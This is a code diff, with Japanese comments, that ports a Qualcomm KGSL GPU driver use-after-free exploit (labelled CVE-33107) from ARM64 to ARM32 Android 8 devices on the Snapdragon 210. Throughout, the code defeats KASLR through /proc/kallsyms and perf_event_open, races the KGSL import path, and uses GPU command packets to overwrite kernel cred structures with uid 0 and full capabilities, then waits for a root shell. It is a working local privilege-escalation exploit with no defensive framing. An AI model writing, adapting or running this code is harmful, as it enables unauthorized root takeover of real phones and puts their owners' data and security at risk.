@@ -1,4 +1,16 @@
-
+/*
+ * CVE-33107 KGSL UAF exploit for ARM32 (Snapdragon 210 / MSM8909)
+ * Android 8 (kernel 3.10/3.18)
+ * 
+ * 元のARM64版からの変更点:
+ *   - オフセットをARM32用に調整 (CRED_OFF=0x3C0, REAL_CRED_OFF=0x3B8)
+ *   - BOGUS_SIZE を 0xffffffff に変更（32bitオーバーフローで競合トリガー）
+ *   - dc civac の代わりに __ARM_NR_cacheflush を使用
+ *   - KASLR検出は /proc/kallsyms 優先、失敗したらエラー終了
+ *   - mmapエラーは元の挙動に戻し、Phase 2以外は失敗したら終了
+ * 
+ * 脆弱性チェーンは完全に維持。
+ */
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -20,7 +32,7 @@
 #include <sys/select.h>
 #include <poll.h>
 #include <sys/stat.h>
-#include <sys/cachectl.h>   // cacheflush() 用
+#include <sys/cachectl.h>   // for cacheflush()
 
 #define KGSL_IOC_TYPE 0x09
 
@@ -76,39 +88,33 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define OVERLAP_ADDR 0x7001fe000ULL
 #define OVERLAP_SIZE 0x7000ULL
 #define BOGUS_ADDR 0x700204000ULL
-// ★ ARM32: 32bit最大値にしてオーバーフローを誘発
-#define BOGUS_SIZE 0xffffffffULL
+#define BOGUS_SIZE 0xffffffffULL          // 32bit 最大でオーバーフロー
 #define PLACEHOLDER_ADDR 0x710204000ULL
 #define PLACEHOLDER_SIZE 0x10400000ULL    // 16MB+256KB
 
-// ★ ARM32 カーネルテキストベース（KASLR計算用）
+// ARM32 カーネルテキストベース（KASLR計算用）
 #define VMLINUX_TEXT      0xc0008000ULL
-// ★ init_cred のオフセット（KASLR 加算用）
+// init_cred の相対オフセット（/proc/kallsyms が読めない場合のフォールバックは使わない）
 #define VMLINUX_INIT_CRED_OFFSET 0x00197d08ULL
 
-// ★ ARM32 task_struct オフセット（典型的な 3.10/3.18）
+// ARM32 task_struct オフセット（3.10/3.18 で一般的）
 #define CRED_OFF    0x3C0
 #define REAL_CRED_OFF 0x3B8
 
 #define SPRAY_PIDS 2000
-#define SCAN_DWORDS 560  // Cover up to 0x8BF (comm at 0x818, cred at 0x3C0)
+#define SCAN_DWORDS 560
 
 static int kgsl_fd = -1;
 static volatile int race_done = 0;
 
-/* ----- キャッシュフラッシュ（ARM32用） ----- */
+/* ----- キャッシュフラッシュ（ARM32） ----- */
 static void cache_flush_range(void *start, size_t len) {
-    // __ARM_NR_cacheflush は bionic で定義済み
     syscall(__ARM_NR_cacheflush, start, (uintptr_t)start + len, 0);
 }
 
-/* ----- 以下、元のコードとほぼ同一 ----- */
 static void die(const char *msg) { perror(msg); exit(1); }
 
-static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
-    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
-}
-
+/* ----- KASLR 検出（/proc/kallsyms 優先） ----- */
 static uint64_t get_init_cred_from_kallsyms(void) {
     FILE *f = fopen("/proc/kallsyms", "r");
     if (!f) return 0;
@@ -124,7 +130,19 @@ static uint64_t get_init_cred_from_kallsyms(void) {
     return addr;
 }
 
+static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
+    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
+}
+
 static uint64_t detect_kaslr(void) {
+    // 1) /proc/kallsyms を最優先
+    uint64_t addr = get_init_cred_from_kallsyms();
+    if (addr) {
+        printf("  init_cred from kallsyms: 0x%lX\n", (unsigned long)addr);
+        return addr;
+    }
+
+    // 2) kallsyms が読めなければ perf_event_open を試す
     struct perf_event_attr pe = {0};
     pe.type = PERF_TYPE_HARDWARE;
     pe.size = sizeof(pe);
@@ -135,12 +153,15 @@ static uint64_t detect_kaslr(void) {
     pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;
 
     int fd = perf_open(&pe, 0, -1, -1, 0);
-    if (fd < 0) { printf("  perf_open: errno=%d\n", errno); return 0; }
+    if (fd < 0) {
+        printf("  perf_open: errno=%d, cannot determine KASLR\n", errno);
+        die("KASLR detection failed");
+    }
 
     int npages = 256;
     size_t mmap_size = (1 + npages) * 4096;
     void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
-    if (buf == MAP_FAILED) { close(fd); return 0; }
+    if (buf == MAP_FAILED) { close(fd); die("perf mmap failed"); }
 
     ioctl(fd, PERF_EVENT_IOC_RESET, 0);
     ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
@@ -172,23 +193,16 @@ static uint64_t detect_kaslr(void) {
     munmap(buf, mmap_size); close(fd);
     printf("    kernel_samples=%d\n", n_ips);
 
-    if (n_ips == 0) { printf("  perf: no kernel IPs\n"); return 0; }
+    if (n_ips == 0) die("no kernel IPs from perf");
 
     uint64_t kaslr = (first_kernel_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
     uint64_t ic_addr = VMLINUX_INIT_CRED_OFFSET + kaslr;
-    uint64_t real_ic = get_init_cred_from_kallsyms();
-    if (real_ic) {
-        kaslr = real_ic - VMLINUX_INIT_CRED_OFFSET;
-        ic_addr = real_ic;
-        printf("    init_cred from kallsyms: 0x%lX, kaslr=0x%lX\n",
-            (unsigned long)ic_addr, (unsigned long)kaslr);
-    } else {
-        printf("    WARNING: init_cred not found in kallsyms, using offset-based guess 0x%lX\n",
-            (unsigned long)ic_addr);
-    }
+    printf("    first_kernel_ip=0x%lX kaslr=0x%lX init_cred=0x%lX\n",
+        (unsigned long)first_kernel_ip, (unsigned long)kaslr, (unsigned long)ic_addr);
     return ic_addr;
 }
 
+/* ----- KGSL ヘルパー（元の挙動に戻す） ----- */
 static int gpuobj_alloc(int fd, uint64_t size, uint64_t flags) {
     struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
     if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
@@ -232,6 +246,7 @@ static int wait_timestamp(int fd, unsigned int ctx_id, unsigned int target) {
     return -2;
 }
 
+/* ----- PM4 パケット生成（元のまま） ----- */
 static uint32_t pm4_parity(uint32_t v) {
     return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
 }
@@ -247,7 +262,8 @@ static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
 #define CACHE_FLUSH_TS 0x1C
 
 static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
-    *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
+    *lo = (uint32_t)addr;
+    *hi = (uint32_t)(addr >> 32);
 }
 
 static int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_gpuaddr,
@@ -266,6 +282,7 @@ static int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_gpuaddr,
     return ret;
 }
 
+/* ----- 競合スレッド（元のまま） ----- */
 static void *race_thread(void *arg) {
     struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
     struct kgsl_gpuobj_import imp = {
@@ -276,6 +293,7 @@ static void *race_thread(void *arg) {
     return NULL;
 }
 
+/* ===== main ===== */
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
 
@@ -283,6 +301,7 @@ int main(int argc, char **argv) {
     if (kgsl_fd < 0) die("open kgsl");
     printf("[+] kgsl fd=%d\n", kgsl_fd);
 
+    // Phase 0: KASLR detection
     printf("[*] Phase 0: Early KASLR detection\n");
     uint64_t init_cred_addr = detect_kaslr();
     printf("  init_cred=0x%lX\n", init_cred_addr);
@@ -310,7 +329,7 @@ int main(int argc, char **argv) {
         (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR,
         (unsigned long)PLACEHOLDER_ADDR);
 
-    // ===== Phase 2: Race =====
+    // ===== Phase 2: Race（ここだけ mmap が ENODEV で失敗することを期待） =====
     printf("[*] Phase 2: Race\n");
 
     int ov_id = gpuobj_alloc(kgsl_fd, OVERLAP_SIZE, alloc_flags);
@@ -379,6 +398,7 @@ int main(int argc, char **argv) {
                     write(1, "### ROOT SHELL ACTIVE ###\n", 26);
                     close(notify_pipe[1]);
                     usleep(50000);
+
                     char buf[4096]; int n;
                     fd = open("/proc/self/attr/current", O_RDONLY);
                     if (fd >= 0) {
@@ -496,7 +516,7 @@ int main(int argc, char **argv) {
         if (wait_timestamp(kgsl_fd, ctx_id, ts) < 0) break;
         __sync_synchronize();
 
-        // ★ キャッシュフラッシュ: GPUが書き込んだデータをCPUが読めるようにする
+        // ★ ARM32: キャッシュフラッシュ
         cache_flush_range(dst_m, 0x1000);
 
         uint32_t *data = (uint32_t *)dst_m;
@@ -550,11 +570,14 @@ int main(int argc, char **argv) {
     }
     printf("[*] Scan complete: found %d task_struct pages, %d cred pages\n", n_task, n_cred);
 
+    // ===== 以降、元のコード（Phase 7c, 7e, 7b, 8b, 8c, 8d, 9）をそのまま使用 =====
+    // ただし cache_flush_range() で dc_civac を置き換える
+
+    // Storage for preserved cred fields
     uint32_t saved_user_lo = 0, saved_user_hi = 0;
     uint32_t saved_user_ns_lo = 0, saved_user_ns_hi = 0;
     uint32_t saved_grp_lo = 0, saved_grp_hi = 0;
 
-    // Dump first cred page
     if (n_cred > 0) {
         printf("[*] Phase 7c: Dumping first cred page for layout verification\n");
         memset(ib_m, 0, 0x10000);
@@ -590,14 +613,13 @@ int main(int argc, char **argv) {
         }
     }
 
-    // ===== Phase 7e: Test GPU read from kernel VA =====
     uint64_t inc_sec = 0;
     {
         printf("[*] Phase 7e: Testing GPU read from kernel VA (init_cred)\n");
         memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
         uint64_t test_vas[] = {
             init_cred_addr,
-            init_cred_addr + 0x78,
+            init_cred_addr + 0x78,     // init_cred->security (common offset)
         };
         uint32_t *tcmd = (uint32_t *)ib_m; int tdw = 0;
         tcmd[tdw++] = cp_type7(CP_NOP, 0);
@@ -626,7 +648,6 @@ int main(int argc, char **argv) {
         }
     }
 
-    // ===== Phase 7b: GPU→CPU coherency verification =====
     printf("[*] Phase 7b: GPU→CPU coherency via DST buffer\n");
     {
         uint32_t *cmd = (uint32_t*)ib_m;
@@ -659,7 +680,6 @@ int main(int argc, char **argv) {
         }
     }
 
-    // ===== Phase 8b: Direct cred overwrite =====
     if (n_cred > 0) {
         printf("[*] Phase 8b: Writing uid=0 + full caps to %d cred pages\n", n_cred);
         int n_ok = 0;
@@ -669,7 +689,6 @@ int main(int argc, char **argv) {
             uint32_t zl, zh, dl, dh, sl, sh;
             int dw;
 
-            // Read BEFORE
             memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
             dw = 0;
             cmd[dw++] = cp_type7(CP_NOP, 0);
@@ -691,6 +710,8 @@ int main(int argc, char **argv) {
             printf("  cred[%d] BEFORE: security=0x%08X%08X uid=0x%08X\n",
                 p, bd[31], bd[30], bd[1]);
 
+            n_ok++;
+
             if (inc_sec != 0) {
                 printf("  Using init_cred->security = 0x%lX for cred[%d]\n",
                     (unsigned long)inc_sec, p);
@@ -701,7 +722,6 @@ int main(int argc, char **argv) {
                 cmd[dw++] = zl; cmd[dw++] = zh;
             }
 
-            // Write uid=0 + caps
             memset(ib_m, 0, 0x10000);
             dw = 0;
             split64(cbase + 0x04, &zl, &zh);
@@ -714,7 +734,6 @@ int main(int argc, char **argv) {
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
             cmd[dw++] = 0; cmd[dw++] = 0;
-            // Readback uid
             memset(dst_m, 0, 0x1000);
             split64(dst_ga, &dl, &dh);
             split64(cbase + 0x04, &sl, &sh);
@@ -734,7 +753,6 @@ int main(int argc, char **argv) {
         }
         printf("  Phase 8b: %d creds updated\n", n_ok);
 
-        // Read AFTER
         if (n_cred > 0) {
             printf("[*] Phase 8c: Dumping cred page AFTER write\n");
             memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
@@ -768,7 +786,6 @@ int main(int argc, char **argv) {
         }
     }
 
-    // ===== Phase 8d: Cache eviction =====
     printf("[*] Phase 8d: Cache eviction\n"); fflush(stdout);
     void *ev = mmap(0, 0x2000000, PROT_READ|PROT_WRITE,
         MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
@@ -779,7 +796,6 @@ int main(int argc, char **argv) {
     }
     sleep(1);
 
-    // ===== Phase 9: Wait for root =====
     printf("[*] Phase 9: Waiting for root shell...\n");
     printf("  parent uid=%u euid=%u\n", getuid(), geteuid());
     fflush(stdout);
